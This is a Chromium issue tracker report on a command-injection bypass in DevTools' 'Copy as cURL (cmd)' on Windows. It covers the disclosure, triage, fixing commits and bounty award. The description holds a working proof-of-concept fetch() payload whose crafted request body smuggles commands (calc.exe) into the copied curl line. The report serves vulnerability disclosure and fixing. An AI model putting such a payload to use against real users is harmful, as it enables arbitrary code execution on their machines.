# Copy as Curl (CMD) Leads to code execution on windows

| Field | Value |
|-------|-------|
| **Issue ID** | [406631048](https://issues.chromium.org/issues/406631048) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Platform>DevTools>Network |
| **Platforms** | Windows |
| **Chrome Version** | 136.0.7092.0 (Official Build) canary (64-bit) |
| **Reporter** | am...@gmail.com |
| **Assignee** | da...@google.com |
| **Created** | 2025-03-27 |
| **Bounty** | $1,000.00 |

## Description

# Steps to reproduce the problem

1. Copy and run the payload in console (we can achieve it via html page too)
2. Copy the request with copy as curl (windows)
3. Paste on the windows cmd you can see calc triggers

# Problem Description

HI Team, chrome latest on windows is vulnerable for code execution using copy as curl(cmd) which allows attacker to excute arbitrary code on victims (windows) machine

Issue ref: <https://issues.chromium.org/issues/352651673>
Similar issue was already reported to chrome and fixed (ref above) but now it was bypassed with my attached payload

Payload:
fetch("<https://example.com/postit>", {
"credentials": "omit",
"headers": {
"Accept-Language": "en-US",
"Content-Type": "text/plain",
},
"body": "query=evil\n\ncmd /c calc1.exe\t\r\t calc2.exe \t calc3.exe \rcalc.exe\rcalc.exe\r calc7.exe \rt\r\t calc2.exe \t calc3.exe \r",
"method": "POST",
});

I have attached the poc video for reference

# Summary

Copy as Curl (CMD) Leads to code execution on windows

# Custom Questions

#### Reporter credit:

Ameen Basha M K

# Additional Data

Category: Security   

Chrome Channel: Canary   

Regression: N/A

## Attachments

- Chrome-Copy-As-Curl(windows)-CodeExecution.mp4 (video/mp4, 3.7 MB)
- test.html (text/html, 916 B)

## Timeline

### am...@gmail.com (2025-03-27)

I have attached a poc html, Open this in chrome, in network tab you can see a request as /copyme

Copy the request using copy as curl(cmd) and paste it on cmd, you can see the calc popup

### ch...@chromium.org (2025-03-27)

Thanks for your report. I can repro on Chrome 134 and 136 on Windows. It seems like the explicit ampersand is not necessary to inject the command.

As this is very similar to [crbug.com/352651673](https://crbug.com/352651673), setting same tags and assignee.

### am...@gmail.com (2025-03-28)

Hi team can you update the priority field too? jfyi it allows the attacker to execute code with any numbrr of parameters without any restriction

Also in the mentioned reference bug it wss discussed like after user pasting the command he has to press double enter to trigger calc

But in this case it is not needed the user interaction was eliminated, just after pasting it automatically runs


so hope it has some higher priority and considering the nature it has less complexity too and impact was more. kindly initiate the fix with priority

### ch...@google.com (2025-03-28)

Setting Priority to P2 to match Severity s3. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### am...@gmail.com (2025-04-20)

Friendly Ping, Hi Team any update on this?

### dx...@google.com (2025-05-21)

Project: chromium/src  

Branch: main  

Author: Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6573574>

Temporarily disable http/tests/devtools/copy-network-request.js to land [crrev.com/c/6573473](https://crrev.com/c/6573473)

---


Expand for full commit details
```
     
    Bug: 406631048 
    Change-Id: Iacf5ed495a95b73f43d8e28e1e36dbcde85643e6 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6573574 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Auto-Submit: Danil Somsikov <dsv@chromium.org> 
    Commit-Queue: Danil Somsikov <dsv@chromium.org> 
    Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1463303}

```

---

Files:

- M `third_party/blink/web_tests/TestExpectations`

---

Hash: 607023e4300062d6f99bb14c07cc65f316bb0e66  

Date:  Wed May 21 10:14:57 2025


---

### dx...@google.com (2025-05-21)

Project: devtools/devtools-frontend  

Branch: main  

Author: Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6573473>

Also handle sole carriage return character (CR) when escaping curl command.

---


Expand for full commit details
```
     
    Bug: 406631048 
    Change-Id: I947dbf54d290ada4424bfbfcc817e1e7244bf438 
    Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/6573473 
    Auto-Submit: Danil Somsikov <dsv@chromium.org> 
    Commit-Queue: Danil Somsikov <dsv@chromium.org> 
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org> 
    Commit-Queue: Benedikt Meurer <bmeurer@chromium.org>

```

---

Files:

- M `front_end/panels/network/NetworkLogView.test.ts`
- M `front_end/panels/network/NetworkLogView.ts`

---

Hash: 5381a527929f5a5842d00a57830950a195ba2488  

Date:  Wed May 21 08:44:06 2025


---

### ch...@google.com (2025-05-21)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### dx...@google.com (2025-05-21)

Project: chromium/src  

Branch: main  

Author: chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:      <https://chromium-review.googlesource.com/6573090>

Roll DevTools Frontend from 01f70bb2cf87 to c018086931b4 (3 revisions)

---


Expand for full commit details
```
     
    https://chromium.googlesource.com/devtools/devtools-frontend.git/+log/01f70bb2cf87..c018086931b4 
     
    2025-05-21 alexrudenko@chromium.org Revert "Disable TabstripComboButton" 
    2025-05-21 ergunsh@chromium.org [Gardener] Increase timeout for ai_assistance e2e tests 
    2025-05-21 dsv@chromium.org Also handle sole carriage return character (CR) when escaping curl command. 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/devtools-frontend-chromium 
    Please CC devtools-waterfall-sheriff-onduty@rotations.google.com,liviurau@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Bug: chromium:406631048,chromium:418675612 
    Change-Id: I571c7ff308c8bd443cd809e3eae851128fe0bece 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6573090 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1463347}

```

---

Files:

- M `DEPS`
- M `third_party/devtools-frontend/src`

---

Hash: ca3a68f4cecfd40e9deab778c9c9234bcf246228  

Date:  Wed May 21 12:53:21 2025


---

### dx...@google.com (2025-05-21)

Project: chromium/src  

Branch: main  

Author: Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6574394>

Re-baseline and re-enable http/tests/devtools/copy-network-request.js after [crrev.com/c/6573473](https://crrev.com/c/6573473)

---


Expand for full commit details
```
     
    Bug: 406631048 
    Change-Id: I09866e358f8eb87ceb97f9589be7b67624aea792 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6574394 
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org> 
    Auto-Submit: Danil Somsikov <dsv@chromium.org> 
    Commit-Queue: Benedikt Meurer <bmeurer@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1463423}

```

---

Files:

- M `third_party/blink/web_tests/TestExpectations`
- M `third_party/blink/web_tests/http/tests/devtools/copy-network-request-expected.txt`

---

Hash: 44090c3e0e7da4d434f86ca171eac6d6b6b34a51  

Date:  Wed May 21 14:41:28 2025


---

### am...@gmail.com (2025-05-28)

deleted

### sp...@google.com (2025-05-28)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
report of lower impact web platform privilege escalation


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-05-29)

Thank you for your efforts and reporting this issue to us!
Please keep comments in security relevant to the issue at hand and limited to technical or other information relevant to the security bug being reported. Since you [comment #12](https://issues.chromium.org/issues/406631048#comment12) was unrelated to this issue, we have removed it. Thank you for filing a new issue, some one from the security team will triage it accordingly.

### am...@gmail.com (2025-05-29)

Thanks for the bounty team, Can i get to know in which verison of chrome stable this will be released and when a CVE will be acknowledged

### am...@chromium.org (2025-06-03)

The fix was landed on 138 and as a fix for a low severity issue does not qualify for backmerge. As such, it will be released in stable milestone of M138, scheduled for release on 24 June 2025: <https://chromiumdash.appspot.com/schedule>

### am...@gmail.com (2025-06-24)

Team can you update the CVE details for this issue

### ch...@google.com (2025-08-28)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> report of lower impact web platform privilege escalation

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/406631048)*
